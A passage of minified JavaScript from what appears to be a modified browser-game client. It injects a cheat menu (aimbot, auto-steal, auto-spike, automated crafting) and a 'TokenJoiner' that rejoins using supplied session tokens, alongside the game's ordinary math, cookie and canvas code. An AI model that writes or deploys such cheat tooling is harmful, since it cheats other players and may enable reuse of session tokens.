          }], {
            folder: "Aimbot"
          });
          e.Register([{
            type: "checkbox",
            label: "AutoSpike",
            object: r.main.autospike,
            property: "enable",
            onChange: e => {}
          }, {
            type: "display",
            label: "AutoSpike Key:",
            object: r.main.autospike,
            property: "bind"
          }, {
            type: "button",
            label: "Set AutoSpike Key",
            action: e => {
              i(r.main.autospike, "bind");
            }
          }], {
            folder: "Auto Spike"
          });
          e.Register([{
            type: "checkbox",
            label: "Extractor  ",
            object: r.main.put,
            property: "extractor",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "Oven  ",
            object: r.main.put,
            property: "oven",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "Windmill  ",
            object: r.main.put,
            property: "windmill",
            onChange: e => {}
          }], {
            folder: "AutoPut"
          });
          e.Register([{
            type: "checkbox",
            label: "Extractor ",
            object: r.main.take,
            property: "extractor",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "Oven ",
            object: r.main.take,
            property: "oven",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "Windmill ",
            object: r.main.take,
            property: "windmill",
            onChange: e => {}
          }], {
            folder: "AutoTake"
          });
          e.Register([{
            type: "text",
            label: "Token",
            object: __,
            property: "token",
            onChange: e => {}
          }, {
            type: "text",
            label: "Token_ID",
            object: __,
            property: "token_id",
            onChange: e => {}
          }, {
            type: "button",
            label: "Respawn",
            action: e => {
              t.rejoin();
            }
          }], {
            folder: "TokenJoiner"
          });
          e.Register([{
            type: "checkbox",
            label: "AutoSteal",
            object: r.main.autosteal,
            property: "enable",
            onChange: e => {}
          }, {
            type: "display",
            label: "AutoSteal Key:",
            object: r.main.autosteal,
            property: "bind"
          }, {
            type: "button",
            label: "Set AutoSteal Key",
            action: e => {
              i(r.main.autosteal, "bind");
            }
          }], {
            folder: "Auto Steal"
          });
          e.Register([{
            type: "display",
            label: "CraftID",
            object: r.main.processing.autocraft,
            property: "id",
            onChange: e => {}
          }, {
            type: "display",
            label: "RecycleID",
            object: r.main.processing.autorecycle,
            property: "id",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "AutoCraft",
            object: r.main.processing.autocraft,
            property: "enable",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "AutoRecycle",
            object: r.main.processing.autorecycle,
            property: "enable",
            onChange: e => {}
          }, {
            type: "display",
            label: "AutoCraft Key:",
            object: r.main.processing.autocraft,
            property: "bind"
          }, {
            type: "button",
            label: "Set AutoCraft Key",
            action: e => {
              i(r.main.processing.autocraft, "bind");
            }
          }, {
            type: "display",
            label: "AutoRecycle Key:",
            object: r.main.processing.autorecycle,
            property: "bind"
          }, {
            type: "button",
            label: "Set AutoRecycle Key",
            action: e => {
              i(r.main.processing.autorecycle, "bind");
            }
          }], {
            folder: "Processing"
          });
          e.Register([{
            type: "checkbox",
            label: "AutoIce",
            object: r.main.misc,
            property: "autoice",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "EcoIce",
            object: r.main.misc,
            property: "ecoice",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "AutoTotem",
            object: r.main.misc.autototem,
            property: "enable",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "AutoCrown",
            object: r.main.misc.autocrown,
            property: "enable",
            onChange: e => {}
          }], {
            folder: "Misc"
          });
          e.Register([{
            type: "display",
            label: "AutoTotem Key:",
            object: r.main.misc.autototem,
            property: "bind"
          }, {
            type: "button",
            label: "Set AutoTotem Key",
            action: e => {
              i(r.main.misc.autototem, "bind");
            }
          }, {
            type: "display",
            label: "DropWeapon Key:",
            object: r.main.misc.dropweapon,
            property: "bind"
          }, {
            type: "button",
            label: "Set DropWeapon Key",
            action: e => {
              i(r.main.misc.dropweapon, "bind");
            }
          }, {
            type: "display",
            label: "WeaponInChest Key:",
            object: r.main.misc.weaponinchest,
            property: "bind"
          }, {
            type: "button",
            label: "Set WeaponInChest Key",
            action: e => {
              i(r.main.misc.weaponinchest, "bind");
            }
          }], {
            folder: "Binds"
          });
        };
        e.src = "https://unpkg.com/guify@0.12.0/lib/guify.min.js";
        document.body.appendChild(e);
      }();
    }, 3500);
    const n = {
      DEV: "development",
      PROD: "production"
    };
    const o = n.PROD;
    function s(e) {
      this.m = 2147483648;
      this.a = 1103515245;
      this.c = 12345;
      this.state = e || Math.floor(Math.random() * (this.m - 1));
    }
    s.prototype.random = function () {
      this.state = (this.a * this.state + this.c) % this.m;
      return this.state / this.m;
    };
    s.prototype.set_seed = function (e) {
      this.state = e;
    };
    RAND_SIZE = 10000;
    RANDOM = [];
    var _ = new s();
    _.set_seed(new Date().getTime());
    for (var E = 0; E < RAND_SIZE; E++) {
      RANDOM.push(_.random());
    }
    Utils = {
      open_in_new_tab: function (e) {
        window.open(e, "_blank").focus();
      },
      open_in_new_box: function (e) {
        window.open(e, "_blank", "location=yes,height=570,width=520,scrollbars=yes,status=yes");
      },
      compare_object: function (e, i) {
        for (var t in e) {
          if (e[t] != i[t]) {
            return false;
          }
        }
        return true;
      },
      compare_array: function (e, i) {
        if (e.length != i.length) {
          return false;
        }
        for (var t = 0; t < e.length; t++) {
          if (typeof e == "object") {
            if (!this.compare_object(e[t], i[t])) {
              return false;
            }
          } else if (e[t] != i[t]) {
            return false;
          }
        }
        return true;
      },
      copy_vector: function (e, i) {
        i.x = e.x;
        i.y = e.y;
      },
      get_vector: function (e, i) {
        return {
          x: e.x - i.x,
          y: e.y - i.y
        };
      },
      mul_vector: function (e, i) {
        e.x *= i;
        e.y *= i;
      },
      scalar_product: function (e, i) {
        return e.x * i.x + e.y * i.y;
      },
      norm: function (e) {
        return Math.sqrt(e.x * e.x + e.y * e.y);
      },
      sign: function (e) {
        if (e < 0) {
          return -1;
        } else {
          return 1;
        }
      },
      cross_product: function (e, i) {
        return e.x * i.y - e.y * i.x;
      },
      get_angle_2: function (e, i, t, r) {
        var n = r - i;
        var a = t - e;
        return Math.atan2(n, a);
      },
      get_angle: function (e, i) {
        return Math.acos(this.scalar_product(e, i) / (this.norm(e) * this.norm(i))) * this.sign(this.cross_product(e, i));
      },
      getURLData: function (e) {
        _url = location.href;
        e = e.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
        var i = new RegExp("[\\?&]" + e + "=([^&#]*)").exec(_url);
        if (i === null) {
          return null;
        } else {
          return i[1];
        }
      },
      reduceAngle: function (e, i) {
        var t = Math.PI * 2;
        i = (i % t + t) % t;
        if (Math.abs(e - i) > Math.PI) {
          if (e > i) {
            return i + t;
          } else {
            return i - t;
          }
        } else {
          return i;
        }
      },
      get_std_angle: function (e, i) {
        return this.get_angle({
          x: 1,
          y: 0
        }, this.get_vector(e, i));
      },
      dist: function (e, i) {
        return Math.sqrt((i.x - e.x) * (i.x - e.x) + (i.y - e.y) * (i.y - e.y));
      },
      build_vector: function (e, i) {
        return {
          x: Math.cos(i) * e,
          y: Math.sin(i) * e
        };
      },
      add_vector: function (e, i) {
        e.x += i.x;
        e.y += i.y;
      },
      sub_vector: function (e, i) {
        e.x -= i.x;
        e.y -= i.y;
      },
      translate_vector: function (e, i, t) {
        e.x += i;
        e.y += t;
      },
      translate_new_vector: function (e, i, t) {
        return {
          x: e.x + i,
          y: e.y + t
        };
      },
      move: function (e, i, t) {
        e.x += Math.cos(t) * i;
        e.y += Math.sin(t) * i;
      },
      middle: function (e, i) {
        return Math.floor((e - i) / 2);
      },
      middle_point: function (e, i) {
        return {
          x: (e.x + i.x) / 2,
          y: (e.y + i.y) / 2
        };
      },
      rand_sign: function () {
        if (Math.random() > 0.5) {
          return 1;
        } else {
          return -1;
        }
      },
      get_rand_pos_in_circle: function (e, i, t) {
        var r = this.rand_sign();
        var n = this.rand_sign();
        var a = Math.random() * Math.PI / 2;
        return {
          x: Math.floor(e + Math.cos(a) * r * t),
          y: Math.floor(i + Math.sin(a) * n * t)
        };
      },
      Box: function (e, i, t, r) {
        this.x = e;
        this.y = i;
        this.w = t;
        this.h = r;
      },
      randomize_list: function (e) {
        a = [];
        a.push.apply(a, e);
        for (var i = []; a.length > 0;) {
          var t = Math.floor(Math.random() * a.length);
          i.push(a[t]);
          a.splice(t, 1);
        }
        return i;
      },
      restore_number: function (e) {
        if (e >= 20000) {
          e = (e - 20000) * 1000;
        } else if (e >= 10000) {
          e = (e - 10000) * 100;
        }
        return e;
      },
      simplify_number: function (e) {
        if (typeof e != "number") {
          return "0";
        }
        if (e >= 10000) {
          var i = Math.floor(Math.log10(e)) - 2;
          var t = Math.max(0, 3 - i);
          var r = Math.floor(e / 1000).toString();
          if (t) {
            for (var n = (r += "." + (e % 1000 / 1000).toString().substring(2).substring(0, t)).length - 1, a = 0; n > 0 && r[n] == "0"; n--) {
              a++;
            }
            if ((r = r.substring(0, r.length - a))[r.length - 1] == ".") {
              r = r.substring(0, r.length - 1);
            }
          }
          return r += "k";
        }
        return e.toString();
      },
      ease_out_quad: function (e) {
        return e * (2 - e);
      },
      ease_out_cubic: function (e) {
        return --e * e * e + 1;
      },
      ease_in_out_quad: function (e) {
        if (e < 0.5) {
          return e * 2 * e;
        } else {
          return (4 - e * 2) * e - 1;
        }
      },
      ease_in_out_cubic: function (e) {
        if (e < 0.5) {
          return e * 4 * e * e;
        } else {
          return (e - 1) * (e * 2 - 2) * (e * 2 - 2) + 1;
        }
      },
      ease_in_out_quart: function (e) {
        if (e < 0.5) {
          return e * 8 * e * e * e;
        } else {
          return 1 - --e * 8 * e * e * e;
        }
      },
      ease_out_quart: function (e) {
        return 1 - --e * e * e * e;
      },
      ease_out_quint: function (e) {
        return 1 + --e * e * e * e * e;
      },
      LinearAnimation: function (e, i, t, r, n, a) {
        this.o = e;
        this.v = i;
        this.max = t;
        this.min = r;
        this.max_speed = n;
        this.min_speed = a;
        this.last = 0;
        this.update = function () {
          if (this.o) {
            if ((e = this.v + I_ * this.max_speed) > this.max) {
              this.v = this.max;
              this.o = false;
              return true;
            }
            this.v = e;
          } else {
            var e;
            if ((e = this.v - I_ * this.min_speed) < this.min) {
              this.v = this.min;
              this.o = true;
            } else {
              this.v = e;
            }
          }
        };
        return false;
      },
      Ease: function (e, i, t, r, n, a) {
        this.fun = e;
        this.ed = i;
        this.em = t;
        this.sx = r;
        this.x = n;
        this.ex = a;
        this.restart = function () {
          this.x = this.sex;
          this.ed = 0;
        };
        this.ease = function (e) {
          if (e !== this.ex) {
            this.ex = e;
            this.sx = this.x;
            this.ed = 0;
          }
          if (this.ex !== this.x) {
            this.ed += I_;
            if (this.ed > this.em) {
              this.x = this.ex;
            } else {
              var i = this.fun(this.ed / this.em);
              this.x = this.sx + (this.ex - this.sx) * i;
            }
          }
        };
      },
      Ease2d: function (e, i, t, r, n, a, o, s, _) {
        this.fun = e;
        this.ed = i;
        this.em = t;
        this.sx = r;
        this.sy = n;
        this.x = a;
        this.y = o;
        this.ex = s;
        this.ey = _;
        this.ease = function (e) {
          if (!(e.x == this.ex && e.y == this.ey)) {
            this.ex = e.x;
            this.ey = e.y;
            this.sx = this.x;
            this.sy = this.y;
            this.ed = 0;
          }
          if (this.ex != this.x || this.ey != this.y) {
            this.ed += I_;
            if (this.ed > this.em) {
              this.x = this.ex;
              this.y = this.ey;
            } else {
              var i = this.fun(this.ed / this.em);
              this.x = this.sx + (this.ex - this.sx) * i;
              this.y = this.sy + (this.ey - this.sy) * i;
            }
          }
        };
      },
      generate_token: function (e) {
        for (var i = "", t = 0; t < e; t++) {
          i += String.fromCharCode(48 + Math.floor(Math.random() * 74));
        }
        return i;
      },
      gup: function (e, i) {
        if (!i) {
          i = location.href;
        }
        e = e.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
        var t = new RegExp("[\\?&]" + e + "=([^&#]*)").exec(i);
        if (t == null) {
          return null;
        } else {
          return t[1];
        }
      },
      inside_box: function (e, i) {
        return e.x >= i.x && e.x <= i.x + i.w && e.y >= i.y && e.y <= i.y + i.h;
      },
      intersect_aabb: function (e, i, t, r, n, a, o, s) {
        if (Math.max(e, n) < Math.min(i, a) && Math.max(t, o) < Math.min(r, s)) {
          return 1;
        } else {
          return 0;
        }
      },
      lerp: function (e, i, t) {
        return (1 - t) * e + t * i;
      },
      escape_html: function (e) {
        return e.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
      }
    };
    Math.sign = Math.sign || function (e) {
      if (e === 0) {
        return 0;
      } else if (e > 0) {
        return 1;
      } else {
        return -1;
      }
    };
    Math.log10 = Math.log10 || function (e) {
      return Math.log(e) / Math.LOG10;
    };
    (function (e) {
      var i = false;
      if (typeof define == "function" && define.amd) {
        define(e);
        i = true;
      }
      if (typeof exports == "object") {
        module.exports = e();
        i = true;
      }
      if (!i) {
        var t = window.Cookies;
        var r = window.Cookies = e();
        r.noConflict = function () {
          window.Cookies = t;
          return r;
        };
      }
    })(function () {
      function e() {
        for (var e = 0, i = {}; e < arguments.length; e++) {
          var t = arguments[e];
          for (var r in t) {
            i[r] = t[r];
          }
        }
        return i;
      }
      return function i(t) {
        function r(i, n, a) {
          var o;
          if (typeof document != "undefined") {
            if (arguments.length > 1) {
              if (typeof (a = e({
                path: "/"
              }, r.defaults, a)).expires == "number") {
                var s = new Date();
                s.setMilliseconds(s.getMilliseconds() + a.expires * 86400000);
                a.expires = s;
              }
              try {
                o = JSON.stringify(n);
                if (/^[\{\[]/.test(o)) {
                  n = o;
                }
              } catch (e) {}
              n = t.write ? t.write(n, i) : encodeURIComponent(String(n)).replace(/%(23|24|26|2B|3A|3C|3E|3D|2F|3F|40|5B|5D|5E|60|7B|7D|7C)/g, decodeURIComponent);
              i = (i = (i = encodeURIComponent(String(i))).replace(/%(23|24|26|2B|5E|60|7C)/g, decodeURIComponent)).replace(/[\(\)]/g, escape);
              return document.cookie = [i, "=", n, a.expires ? "; expires=" + a.expires.toUTCString() : "", a.path ? "; path=" + a.path : "", a.domain ? "; domain=" + a.domain : "", a.secure ? "; secure" : ""].join("");
            }
            if (!i) {
              o = {};
            }
            for (var _ = document.cookie ? document.cookie.split("; ") : [], E = /(%[0-9A-Z]{2})+/g, T = 0; T < _.length; T++) {
              var A = _[T].split("=");
              var d = A.slice(1).join("=");
              if (d.charAt(0) === "\"") {
                d = d.slice(1, -1);
              }
              try {
                var h = A[0].replace(E, decodeURIComponent);
                d = t.read ? t.read(d, h) : t(d, h) || d.replace(E, decodeURIComponent);
                if (this.json) {
                  try {
                    d = JSON.parse(d);
                  } catch (e) {}
                }
                if (i === h) {
                  o = d;
                  break;
                }
                if (!i) {
                  o[h] = d;
                }
              } catch (e) {}
            }
            return o;
          }
        }
        r.set = r;
        r.get = function (e) {
          return r.call(r, e);
        };
        r.getJSON = function () {
          return r.apply({
            json: true
          }, [].slice.call(arguments));
        };
        r.defaults = {};
        r.remove = function (i, t) {
          r(i, "", e(t, {
            expires: -1
          }));
        };
        r.withConverter = i;
        return r;
      }(function () {});
    });
    var T;
    var A;
    var d;
    var I;
    var u;
    var O;
    var c;
    var R;
    var g;
    var C;
    var N = document.getElementById("game_canvas");
    var D = N.getContext("2d");
    var S = N.width;
    var p = N.height;
    var m = N.width / 2;
    var v = N.height / 2;
    var M = {
      x: m,
      y: v
    };
    var L = 1;
    var G = 1;
    var f = -1;
    var H = "J" + c;
    var P = "S" + ie;
    var B = window;
    var z = (Y = "O") + "N";
    var W = "O";
    var V = 0;
    var K = B;
    P = "N";
    var U = "J";
    var Y = "O" + c;
    var k = K;
    var F = k;
    z = "N" + undefined;
    var J = F;
    var X = J;
    var q = X;
    var Z = q;
    U = "O";
    var Q = Z = q;
    var ee = Q;
    var ie = "J" + (g = "S");
    function te(e) {
      var i = new Image();
      i.src = e.toDataURL("image/png");
      i.width = e.width;
      i.height = e.height;
      i.isLoaded = 1;
      return i;
    }
    N.oncontextmenu = function () {
      return false;
    };
    H = "J";
    Y = z;
    z = c;
    c = ie;
    Y = ie;
    d = I = ie + (U += H = P);
    P = U + H;
    u = T = W = ie + U;
    Y = ie + U;
    O = W;
    z = ie + U;
    R = A = T;
    U = c = ie;
    g = W;
    C = T;
    H = Y;
    var re = window.devicePixelRatio || 1;
    var ne = D.webkitBackingStorePixelRatio || D.mozBackingStorePixelRatio || D.msBackingStorePixelRatio || D.oBackingStorePixelRatio || D.backingStorePixelRatio || 1;
    function ae() {
      if (N.width != window.innerWidth) {
        N.width = window.innerWidth;
        S = N.width;
        m = N.width / 2;
      }
      if (N.height != window.innerHeight) {
        N.height = window.innerHeight;
        p = N.height;
        v = N.height / 2;
      }
      M = {
        x: m,
        y: v
      };
      var e = N.width;
      var i = N.height;
      G = f === -1 ? re / ne : f;
      N.width = e * G;
      N.height = i * G;
      N.style.width = e + "px";
      N.style.height = i + "px";
      D.scale(G, G);
      if (__) {
        __.cam.rw = e;
        __.cam.rh = i;
      }
      if (l_.is_run) {
        l_.update();
      } else if (n_.is_run) {
        n_.update();
      } else if (T_.is_run) {
        T_.update();
      } else if (E_.is_run) {
        E_.update();
      }
    }
    var oe = document.getElementById("game_body");
    oe.ondragstart = function () {
      return false;
    };
    oe.ondrop = function () {
      return false;
    };
    oe.onresize = ae;
    (function () {
      for (var e = 0, i = ["ms", "moz", "webkit", "o"], t = 0; t < i.length && !window.requestAnimationFrame; ++t) {
        window.requestAnimationFrame = window[i[t] + "RequestAnimationFrame"];
        window.cancelAnimationFrame = window[i[t] + "CancelAnimationFrame"] || window[i[t] + "CancelRequestAnimationFrame"];
      }
      if (!window.requestAnimationFrame) {
        window.requestAnimationFrame = function (i, t) {
          var r = new Date().getTime();
          var n = Math.max(0, 16 - (r - e));
          var a = window.setTimeout(function () {
            i(r + n);
          }, n);
          e = r + n;
          return a;
        };
      }
      if (!window.cancelAnimationFrame) {
        window.cancelAnimationFrame = function (e) {
          clearTimeout(e);
        };
      }
    })();
    var se = navigator.language || navigator.userLanguage;
    var _e = -new Date().getTimezoneOffset() / 60;
    var Ee = "Europe";
    var Te = "South America";
    var Ae = Ee;
    if (_e >= -2 && _e <= 2) {
      Ae = Ee;
    } else if (_e > 2 && _e <= 5) {
      Ae = "Russia";
    } else if (_e > 5 && _e <= 9) {
      Ae = "Asia";
    } else if (_e > 9) {
      Ae = "Australia";
    } else if (_e >= -5 && _e < -2) {
      Ae = se === "pt-BR" || se === "pt-br" || se === "pt" || se === "pt-pt" ? Te : "North America";
    } else if (_e < -5) {
      Ae = se === "pt-BR" || se === "pt-br" || se === "pt" || se === "pt-pt" ? Te : "West America";
    }
    var s = {
      Random: function (e) {
        var i = 2147483648;
        var t = e || Math.floor(Math.random() * (i - 1));
        this.init = function (e) {
          t = e || Math.floor(Math.random() * (i - 1));
        };
        this.get = function () {
          return (t = (t * 1103515245 + 12345) % i) / i;
        };
      }
    };
    var de = [[0, "DRAGON", 18, 6, 66, 35, 0], [0, "WINTER", 91, 18, 5, 40, 8], [0, "DESERT", 135, 180, 89, 124, 5], [0, "LAVA", 142, 6, 82, 99, 6], [0, "FOREST", 6, 150, 90, 154, 8], [0, "WINTER", 6, 6, 90, 150, 0], [1, "b", 0, 5, 175, 0], [1, "t", 2, 5, 174, 0], [1, "t", 5, 5, 173, 0], [1, "b", 3, 5, 176, 0], [1, "t", 0, 5, 177, 0], [1, "t", 3, 5, 178, 0], [1, "t", 4, 5, 179, 0], [1, "b", 0, 5, 180, 0], [1, "t", 5, 5, 181, 0], [1, "b", 2, 5, 182, 0], [1, "b", 1, 5, 183, 0], [1, "b", 2, 5, 184, 0], [1, "t", 5, 5, 185, 0], [1, "t", 2, 5, 186, 0], [1, "t", 0, 5, 187, 0], [1, "t", 5, 5, 188, 0], [1, "t", 1, 5, 189, 0], [1, "b", 2, 5, 190, 0], [1, "t", 4, 5, 191, 0], [1, "b", 3, 5, 192, 0], [1, "t", 5, 5, 193, 0], [1, "t", 0, 5, 194, 0], [1, "t", 3, 5, 195, 0], [1, "b", 0, 5, 196, 0], [1, "t", 5, 5, 197, 0], [1, "t", 2, 5, 198, 0], [1, "b", 2, 5, 199, 0], [1, "t", 4, 5, 200, 0], [1, "t", 1, 5, 201, 0], [1, "b", 1, 5, 202, 0], [1, "t", 5, 5, 203, 0], [1, "t", 2, 5, 204, 0], [1, "t", 4, 5, 205, 0], [1, "b", 2, 5, 206, 0], [1, "t", 1, 5, 207, 0], [1, "t", 4, 5, 208, 0], [1, "t", 2, 5, 209, 0], [1, "b", 0, 5, 210, 0], [1, "t", 5, 5, 211, 0], [1, "t", 1, 5, 212, 0], [1, "t", 2, 5, 213, 0], [1, "b", 3, 5, 214, 0], [1, "t", 5, 5, 215, 0], [1, "b", 0, 5, 216, 0], [1, "t", 4, 5, 217, 0], [1, "t", 2, 5, 218, 0], [1, "t", 1, 5, 219, 0], [1, "t", 3, 5, 220, 0], [1, "t", 5, 5, 221, 0], [1, "t", 2, 5, 222, 0], [1, "t", 4, 5, 223, 0], [1, "b", 3, 5, 224, 0], [1, "t", 1, 5, 225, 0], [1, "t", 3, 5, 226, 0], [1, "b", 0, 5, 227, 0], [1, "t", 3, 5, 228, 0], [1, "t", 5, 5, 229, 0], [1, "t", 2, 5, 230, 0], [1, "t", 0, 5, 231, 0], [1, "b", 2, 5, 232, 0], [1, "t", 1, 5, 233, 0], [1, "t", 4, 5, 234, 0], [1, "b", 1, 5, 235, 0], [1, "t", 4, 5, 236, 0], [1, "t", 2, 5, 237, 0], [1, "t", 0, 5, 238, 0], [1, "t", 4, 5, 239, 0], [1, "b", 2, 5, 240, 0], [1, "t", 5, 5, 241, 0], [1, "b", 1, 5, 242, 0], [1, "t", 4, 5, 243, 0], [1, "t", 2, 5, 244, 0], [1, "t", 1, 5, 245, 0], [1, "b", 1, 5, 246, 0], [1, "t", 3, 5, 247, 0], [1, "b", 2, 5, 248, 0], [1, "t", 5, 5, 249, 0], [1, "t", 2, 5, 250, 0], [1, "t", 4, 5, 251, 0], [1, "b", 1, 5, 252, 0], [1, "t", 4, 5, 253, 0], [1, "t", 1, 5, 254, 0], [1, "t", 3, 5, 255, 0], [1, "t", 5, 5, 256, 0], [1, "b", 2, 5, 257, 0], [1, "t", 4, 5, 258, 0], [1, "b", 3, 5, 259, 0], [1, "t", 5, 5, 260, 0], [1, "b", 0, 5, 261, 0], [1, "t", 3, 5, 262, 0], [1, "t", 4, 5, 263, 0], [1, "t", 2, 5, 264, 0], [1, "b", 1, 5, 265, 0], [1, "b", 2, 5, 266, 0], [1, "t", 3, 5, 267, 0], [1, "t", 4, 5, 268, 0], [1, "t", 0, 5, 269, 0], [1, "t", 5, 5, 270, 0], [1, "t", 3, 5, 271, 0], [1, "t", 4, 5, 272, 0], [1, "t", 1, 5, 273, 0], [1, "b", 2, 5, 274, 0], [1, "t", 1, 5, 275, 0], [1, "t", 4, 5, 276, 0], [1, "b", 1, 5, 277, 0], [1, "b", 2, 5, 278, 0], [1, "t", 1, 5, 279, 0], [1, "t", 4, 5, 280, 0], [1, "t", 2, 5, 281, 0], [1, "t", 5, 5, 282, 0], [1, "b", 2, 5, 283, 0], [1, "t", 1, 5, 284, 0], [1, "b", 3, 5, 285, 0], [1, "t", 4, 5, 286, 0], [1, "t", 0, 5, 287, 0], [1, "t", 5, 5, 288, 0], [1, "t", 2, 5, 289, 0], [1, "b", 1, 5, 290, 0], [1, "t", 4, 5, 292, 0], [1, "t", 2, 5, 291, 0], [1, "b", 2, 5, 293, 0], [1, "t", 1, 5, 294, 0], [1, "t", 3, 5, 295, 0], [1, "t", 5, 5, 296, 0], [1, "b", 0, 5, 297, 0], [1, "b", 3, 5, 298, 0], [1, "t", 4, 5, 299, 0], [1, "t", 2, 5, 300, 0], [1, "t", 4, 5, 301, 0], [1, "b", 0, 5, 302, 0], [1, "b", 2, 5, 303, 0], [1, "t", 1, 6, 303, 0], [1, "t", 2, 7, 303, 0], [1, "t", 1, 5, 304, 0], [1, "t", 3, 6, 304, 0], [1, "t", 4, 7, 304, 0], [1, "t", 5, 8, 303, 0], [1, "b", 1, 8, 304, 0], [1, "b", 2, 9, 304, 0], [1, "b", 3, 12, 303, 0], [1, "b", 3, 17, 304, 0], [1, "t", 1, 9, 303, 0], [1, "t", 1, 15, 304, 0], [1, "t", 1, 13, 303, 0], [1, "t", 3, 10, 303, 0], [1, "t", 3, 14, 304, 0], [1, "t", 4, 10, 304, 0], [1, "t", 5, 11, 304, 0], [1, "t", 5, 14, 303, 0], [1, "t", 5, 16, 304, 0], [1, "t", 5, 13, 304, 0], [1, "t", 2, 12, 304, 0], [1, "t", 1, 11, 303, 0], [1, "b", 3, 15, 303, 0], [1, "b", 0, 16, 303, 0], [1, "t", 3, 17, 303, 0], [1, "t", 4, 18, 303, 0], [1, "t", 2, 19, 303, 0], [1, "t", 1, 20, 303, 0], [1, "b", 1, 21, 303, 0], [1, "t", 2, 22, 303, 0], [1, "t", 4, 23, 303, 0], [1, "b", 3, 24, 303, 0], [1, "t", 5, 25, 303, 0], [1, "t", 1, 26, 303, 0], [1, "t", 2, 27, 303, 0], [1, "t", 4, 28, 303, 0], [1, "b", 0, 18, 304, 0], [1, "t", 2, 19, 304, 0], [1, "t", 5, 20, 304, 0], [1, "b", 2, 21, 304, 0], [1, "t", 4, 22, 304, 0], [1, "t", 2, 23, 304, 0], [1, "t", 1, 24, 304, 0], [1, "t", 3, 25, 304, 0], [1, "t", 0, 27, 304, 0], [1, "t", 5, 26, 304, 0], [1, "b", 2, 28, 304, 0], [1, "t", 1, 29, 304, 0], [1, "b", 1, 29, 303, 0], [1, "b", 2, 30, 303, 0], [1, "t", 4, 31, 303, 0], [1, "t", 0, 32, 303, 0], [1, "t", 5, 33, 303, 0], [1, "t", 2, 34, 303, 0], [1, "t", 4, 35, 303, 0], [1, "t", 1, 36, 303, 0], [1, "b", 3, 37, 303, 0], [1, "t", 2, 32, 304, 0], [1, "t", 4, 30, 304, 0], [1, "t", 1, 31, 304, 0], [1, "b", 1, 33, 304, 0], [1, "t", 2, 35, 304, 0], [1, "t", 5, 34, 304, 0], [1, "b", 2, 36, 304, 0], [1, "t", 5, 37, 304, 0], [1, "t", 1, 38, 304, 0], [1, "b", 1, 40, 303, 0], [1, "t", 3, 39, 303, 0], [1, "t", 3, 42, 304, 0], [1, "t", 5, 38, 303, 0], [1, "t", 5, 39, 304, 0], [1, "t", 5, 41, 303, 0], [1, "t", 4, 41, 304, 0], [1, "t", 4, 44, 303, 0], [1, "b", 2, 40, 304, 0], [1, "b", 2, 43, 303, 0], [1, "t", 1, 42, 303, 0], [1, "t", 1, 43, 304, 0], [1, "t", 5, 44, 304, 0], [1, "b", 1, 45, 303, 0], [1, "t", 2, 45, 304, 0], [1, "t", 2, 46, 303, 0], [1, "t", 4, 47, 303, 0], [1, "b", 0, 48, 303, 0], [1, "t", 5, 49, 303, 0], [1, "t", 2, 50, 303, 0], [1, "t", 1, 51, 303, 0], [1, "t", 4, 52, 303, 0], [1, "t", 5, 46, 304, 0], [1, "t", 2, 47, 304, 0], [1, "t", 5, 48, 304, 0], [1, "t", 1, 49, 304, 0], [1, "t", 2, 50, 304, 0], [1, "b", 1, 53, 303, 0], [1, "b", 2, 51, 304, 0], [1, "t", 5, 52, 304, 0], [1, "t", 3, 53, 304, 0], [1, "b", 2, 54, 303, 0], [1, "t", 5, 54, 304, 0], [1, "t", 5, 55, 303, 0], [1, "t", 3, 56, 303, 0], [1, "t", 4, 57, 303, 0], [1, "t", 5, 58, 303, 0], [1, "b", 1, 55, 304, 0], [1, "t", 2, 56, 304, 0], [1, "t", 0, 57, 304, 0], [1, "t", 3, 58, 304, 0], [1, "t", 3, 63, 304, 0], [1, "t", 3, 59, 303, 0], [1, "t", 4, 59, 304, 0], [1, "t", 5, 60, 303, 0], [1, "t", 0, 60, 304, 0], [1, "t", 0, 66, 303, 0], [1, "t", 0, 70, 304, 0], [1, "t", 3, 61, 304, 0], [1, "t", 3, 67, 303, 0], [1, "t", 3, 73, 304, 0], [1, "t", 3, 76, 303, 0], [1, "t", 3, 78, 304, 0], [1, "t", 1, 61, 303, 0], [1, "t", 1, 73, 303, 0], [1, "t", 1, 79, 303, 0], [1, "b", 2, 62, 304, 0], [1, "b", 2, 70, 303, 0], [1, "t", 5, 62, 303, 0], [1, "t", 5, 68, 303, 0], [1, "t", 5, 71, 304, 0], [1, "t", 5, 77, 304, 0], [1, "t", 5, 75, 303, 0], [1, "t", 5, 64, 304, 0], [1, "t", 5, 65, 303, 0], [1, "t", 5, 80, 303, 0], [1, "t", 1, 76, 304, 0], [1, "t", 3, 63, 303, 0], [1, "t", 5, 82, 304, 0], [1, "b", 2, 65, 304, 0], [1, "t", 1, 64, 303, 0], [1, "t", 1, 68, 304, 0], [1, "t", 2, 69, 304, 0], [1, "t", 4, 69, 303, 0], [1, "t", 5, 66, 304, 0], [1, "t", 0, 67, 304, 0], [1, "b", 2, 72, 304, 0], [1, "t", 0, 71, 303, 0], [1, "t", 4, 72, 303, 0], [1, "t", 4, 74, 304, 0], [1, "t", 2, 74, 303, 0], [1, "t", 3, 75, 304, 0], [1, "t", 1, 77, 303, 0], [1, "t", 4, 78, 303, 0], [1, "t", 4, 79, 304, 0], [1, "t", 2, 80, 304, 0], [1, "b", 1, 81, 304, 0], [1, "t", 2, 81, 303, 0], [1, "t", 5, 82, 303, 0], [1, "t", 1, 83, 303, 0], [1, "b", 2, 83, 304, 0], [1, "t", 1, 84, 304, 0], [1, "t", 4, 84, 303, 0], [1, "t", 5, 85, 304, 0], [1, "t", 3, 85, 303, 0], [1, "b", 2, 86, 304, 0], [1, "t", 1, 86, 303, 0], [1, "b", 3, 87, 303, 0], [1, "t", 4, 87, 304, 0], [1, "t", 4, 88, 303, 0], [1, "t", 0, 88, 304, 0], [1, "b", 1, 89, 303, 0], [1, "t", 3, 89, 304, 0], [1, "t", 